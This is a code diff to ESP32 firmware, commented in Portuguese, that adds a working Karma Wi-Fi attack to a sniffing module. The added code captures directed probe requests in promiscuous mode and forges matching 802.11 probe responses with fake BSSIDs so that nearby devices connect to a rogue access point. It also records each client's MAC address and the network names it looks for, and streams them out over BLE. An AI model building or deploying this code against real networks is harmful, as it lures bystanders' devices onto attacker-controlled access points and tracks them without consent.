@@ -904,3 +904,289 @@ esp_err_t sniff_wifi_pcap_stop(void)
     s_stop = true;
     return ESP_OK;
 }
+
+// ----------------------------------------------------------------------
+// Karma attack — responde a probe requests com probe response forjado
+// ----------------------------------------------------------------------
+
+// Probe Response template (header 24B + body fixo 12B = 36B fixo, mesmo
+// shape do beacon mas com FC subtype=0x5).
+//   FC: 0x50 0x00 (type=Mgmt, subtype=ProbeResp)
+//   addr1: dest = source MAC do probe req (preenchido em runtime)
+//   addr2: source = nosso BSSID fake (preenchido)
+//   addr3: BSSID = nosso BSSID fake
+static const uint8_t s_probe_resp_head[36] = {
+    0x50, 0x00,
+    0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr1: client (preenchido)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr2: BSSID (preenchido)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr3: BSSID (preenchido)
+    0x00, 0x00,                                  // sequence
+    0, 0, 0, 0, 0, 0, 0, 0,                      // timestamp
+    0x64, 0x00,                                  // beacon interval 100 TU
+    0x21, 0x04,                                  // capability: ESS + Short Slot
+};
+
+#define KARMA_MAX_DEDUP   128
+#define KARMA_SSID_MAX    32
+
+typedef struct {
+    uint8_t mac[6];
+    uint8_t ssid_len;
+    char    ssid[KARMA_SSID_MAX];
+} karma_seen_t;
+
+typedef struct {
+    uint8_t  channel;
+    uint16_t duration_sec;
+} karma_ctx_t;
+
+static karma_seen_t *s_karma_seen = NULL;
+static volatile size_t s_karma_seen_count = 0;
+static volatile uint16_t s_karma_hits = 0;
+static volatile uint16_t s_karma_unique_clients = 0;
+static volatile uint16_t s_karma_unique_ssids = 0;
+
+static void karma_make_bssid(uint8_t out[6], const char *ssid, uint8_t ssid_len)
+{
+    uint32_t h = 2166136261u;
+    for (uint8_t i = 0; i < ssid_len; i++) {
+        h ^= (uint8_t)ssid[i];
+        h *= 16777619u;
+    }
+    out[0] = 0x02;
+    out[1] = (uint8_t)((h >> 24) & 0xFF);
+    out[2] = (uint8_t)((h >> 16) & 0xFF);
+    out[3] = (uint8_t)((h >> 8) & 0xFF);
+    out[4] = (uint8_t)(h & 0xFF);
+    out[5] = (uint8_t)(ssid_len & 0xFF);
+}
+
+// Verifica se (mac, ssid) já visto. Se não, adiciona e retorna true.
+// Também atualiza contadores de unique clients/ssids.
+static bool karma_track_unique(const uint8_t mac[6], const uint8_t *ssid,
+                                uint8_t ssid_len)
+{
+    bool mac_seen = false;
+    bool ssid_seen = false;
+    bool pair_seen = false;
+    for (size_t i = 0; i < s_karma_seen_count; i++) {
+        if (memcmp(s_karma_seen[i].mac, mac, 6) == 0) mac_seen = true;
+        if (s_karma_seen[i].ssid_len == ssid_len &&
+            memcmp(s_karma_seen[i].ssid, ssid, ssid_len) == 0) ssid_seen = true;
+        if (mac_seen && ssid_seen &&
+            memcmp(s_karma_seen[i].mac, mac, 6) == 0 &&
+            s_karma_seen[i].ssid_len == ssid_len &&
+            memcmp(s_karma_seen[i].ssid, ssid, ssid_len) == 0) {
+            pair_seen = true;
+        }
+    }
+    if (pair_seen) return false;
+    if (s_karma_seen_count >= KARMA_MAX_DEDUP) return false; // limite
+
+    memcpy(s_karma_seen[s_karma_seen_count].mac, mac, 6);
+    s_karma_seen[s_karma_seen_count].ssid_len = ssid_len;
+    if (ssid_len) memcpy(s_karma_seen[s_karma_seen_count].ssid, ssid, ssid_len);
+    s_karma_seen_count++;
+
+    if (!mac_seen) s_karma_unique_clients++;
+    if (!ssid_seen) s_karma_unique_ssids++;
+    return true;
+}
+
+static void emit_karma_hit(const uint8_t mac[6], const uint8_t *ssid,
+                            uint8_t ssid_len)
+{
+    uint8_t payload[7 + KARMA_SSID_MAX];
+    memcpy(&payload[0], mac, 6);
+    payload[6] = ssid_len;
+    if (ssid_len) memcpy(&payload[7], ssid, ssid_len);
+
+    uint8_t out[TLV_MAX_FRAME_SIZE];
+    int total = tlv_encode(out, sizeof(out),
+                           TLV_MSG_KARMA_HIT, s_seq++,
+                           payload, 7 + ssid_len);
+    if (total > 0) transport_ble_send_stream(out, (size_t)total);
+}
+
+static void emit_karma_done(uint16_t hits, uint16_t clients, uint16_t ssids,
+                             uint32_t elapsed_ms, uint8_t status)
+{
+    uint8_t payload[11];
+    payload[0]  = (uint8_t)(hits >> 8);
+    payload[1]  = (uint8_t)(hits & 0xFF);
+    payload[2]  = (uint8_t)(clients >> 8);
+    payload[3]  = (uint8_t)(clients & 0xFF);
+    payload[4]  = (uint8_t)(ssids >> 8);
+    payload[5]  = (uint8_t)(ssids & 0xFF);
+    payload[6]  = (uint8_t)(elapsed_ms >> 24);
+    payload[7]  = (uint8_t)(elapsed_ms >> 16);
+    payload[8]  = (uint8_t)(elapsed_ms >> 8);
+    payload[9]  = (uint8_t)(elapsed_ms & 0xFF);
+    payload[10] = status;
+
+    uint8_t out[TLV_MAX_FRAME_SIZE];
+    int total = tlv_encode(out, sizeof(out),
+                           TLV_MSG_KARMA_DONE, s_seq++,
+                           payload, sizeof(payload));
+    if (total > 0) transport_ble_send_stream(out, (size_t)total);
+}
+
+// Forja e envia probe response pra o cliente que mandou o probe req.
+static void send_probe_response(const uint8_t client_mac[6],
+                                 const uint8_t *ssid, uint8_t ssid_len,
+                                 uint8_t channel)
+{
+    uint8_t bssid[6];
+    karma_make_bssid(bssid, (const char *)ssid, ssid_len);
+
+    // header(36) + ssid(2+32) + rates(2+4) + DS(2+1) + ERP(2+1) + ExtRates(2+4)
+    uint8_t frame[36 + 34 + 6 + 3 + 3 + 6];
+    size_t off = 0;
+
+    memcpy(&frame[off], s_probe_resp_head, sizeof(s_probe_resp_head));
+    memcpy(&frame[4],  client_mac, 6);   // addr1: dest = client
+    memcpy(&frame[10], bssid,      6);   // addr2: source = BSSID
+    memcpy(&frame[16], bssid,      6);   // addr3: BSSID
+    off += sizeof(s_probe_resp_head);
+
+    // SSID IE
+    frame[off++] = 0x00;
+    frame[off++] = ssid_len;
+    if (ssid_len) memcpy(&frame[off], ssid, ssid_len);
+    off += ssid_len;
+
+    // Supported Rates
+    frame[off++] = 0x01; frame[off++] = 0x04;
+    frame[off++] = 0x82; frame[off++] = 0x84; frame[off++] = 0x8B; frame[off++] = 0x96;
+
+    // DS Parameter
+    frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = channel;
+
+    // ERP IE
+    frame[off++] = 0x2A; frame[off++] = 0x01; frame[off++] = 0x00;
+
+    // Extended Supported Rates
+    frame[off++] = 0x32; frame[off++] = 0x04;
+    frame[off++] = 0x0C; frame[off++] = 0x12; frame[off++] = 0x18; frame[off++] = 0x60;
+
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
+}
+
+static volatile uint8_t s_karma_channel = 0;
+
+static void promisc_cb_karma(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+    if (type != WIFI_PKT_MGMT) return;
+    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *p = pkt->payload;
+    uint16_t len = pkt->rx_ctrl.sig_len;
+    if (len < 24 + 4) return;
+    if (p[0] != 0x40) return; // probe request
+
+    const uint8_t *src = &p[10];
+    const uint8_t *ies = &p[24];
+    uint16_t ies_len = len - 24 - 4;
+    if (ies_len < 2) return;
+    if (ies[0] != 0x00) return;
+    uint8_t ssid_len = ies[1];
+    if (ssid_len == 0) return;       // só direcionados
+    if (ssid_len > KARMA_SSID_MAX) ssid_len = KARMA_SSID_MAX;
+    if (2 + ssid_len > ies_len) return;
+    const uint8_t *ssid = &ies[2];
+
+    // Sempre responde (KARMA agressivo); dedup só pra controlar quantos
+    // hits novos emitir via TLV.
+    send_probe_response(src, ssid, ssid_len, s_karma_channel);
+    s_karma_hits++;
+
+    if (karma_track_unique(src, ssid, ssid_len)) {
+        emit_karma_hit(src, ssid, ssid_len);
+    }
+}
+
+static void karma_task(void *arg)
+{
+    karma_ctx_t *ctx = (karma_ctx_t *)arg;
+    int64_t start_us = esp_timer_get_time();
+    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;
+
+    s_karma_seen = calloc(KARMA_MAX_DEDUP, sizeof(karma_seen_t));
+    if (!s_karma_seen) {
+        emit_karma_done(0, 0, 0, 0, 2);
+        goto cleanup;
+    }
+    s_karma_seen_count = 0;
+    s_karma_hits = 0;
+    s_karma_unique_clients = 0;
+    s_karma_unique_ssids = 0;
+    s_karma_channel = ctx->channel;
+
+    wifi_promiscuous_filter_t filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
+    };
+    esp_wifi_set_promiscuous_filter(&filter);
+
+    esp_err_t err = esp_wifi_set_promiscuous(true);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
+        emit_karma_done(0, 0, 0, 0, 2);
+        goto cleanup_dedup;
+    }
+    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_karma);
+    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);
+
+    while (!s_stop && esp_timer_get_time() < deadline_us) {
+        vTaskDelay(pdMS_TO_TICKS(200));
+    }
+
+    esp_wifi_set_promiscuous(false);
+
+    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
+    emit_karma_done(s_karma_hits, s_karma_unique_clients,
+                    s_karma_unique_ssids, elapsed, 0);
+    ESP_LOGI(TAG, "karma done: %u hits, %u clients, %u ssids in %u ms",
+             (unsigned)s_karma_hits, (unsigned)s_karma_unique_clients,
+             (unsigned)s_karma_unique_ssids, (unsigned)elapsed);
+
+cleanup_dedup:
+    free(s_karma_seen);
+    s_karma_seen = NULL;
+cleanup:
+    free(ctx);
+    s_stop = false;
+    s_task = NULL;
+    s_mode = SNIFF_MODE_IDLE;
+    vTaskDelete(NULL);
+}
+
+esp_err_t sniff_wifi_karma_start(uint8_t channel, uint16_t duration_sec)
+{
+    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
+    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
+    if (duration_sec == 0)   duration_sec = 60;
+    if (duration_sec > 300)  duration_sec = 300;
+
+    karma_ctx_t *ctx = calloc(1, sizeof(*ctx));
+    if (!ctx) return ESP_ERR_NO_MEM;
+    ctx->channel = channel;
+    ctx->duration_sec = duration_sec;
+
+    s_mode = SNIFF_MODE_KARMA;
+    s_stop = false;
+    if (xTaskCreate(karma_task, "karma", 4096, ctx, 5, &s_task) != pdPASS) {
+        free(ctx);
+        s_mode = SNIFF_MODE_IDLE;
+        return ESP_ERR_NO_MEM;
+    }
+    ESP_LOGI(TAG, "karma started on ch=%u for %us",
+             channel, (unsigned)duration_sec);
+    return ESP_OK;
+}
+
+esp_err_t sniff_wifi_karma_stop(void)
+{
+    if (s_mode != SNIFF_MODE_KARMA) return ESP_ERR_INVALID_STATE;
+    s_stop = true;
+    return ESP_OK;
+}
